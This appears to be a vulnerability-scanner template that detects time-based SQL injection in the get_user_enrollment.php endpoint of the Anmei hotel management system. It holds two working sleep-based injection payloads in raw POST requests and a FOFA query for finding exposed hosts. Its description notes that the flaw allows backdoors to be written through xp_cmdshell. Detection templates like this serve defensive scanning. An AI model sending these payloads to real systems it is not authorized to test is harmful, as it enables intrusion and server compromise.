http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          POST /user/get_user_enrollment.php HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

          userid=0'XOR(if(now()=sysdate()%2Csleep(2)%2C0))XOR'Z&usermac=1&portaltype=&portalname=
        - |
          POST /user/get_user_enrollment.php HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36

          userid=0'XOR(if(now()=sysdate()%2Csleep(4)%2C0))XOR'Z&usermac=1&portaltype=&portalname=
id: anmeijiudian-get_user_enrollment_php-sql-time
info:
    author: Superhero
    description: |-
        fofa: title="酒店宽带运营系统"
        安美酒店管理系统/get_user_enrollment.php 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
    name: 安美酒店管理系统/get_user_enrollment.php 接口sql注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/Y_tviQ2xrxhQUNj7xKV8Dg
    severity: high
    tags: []
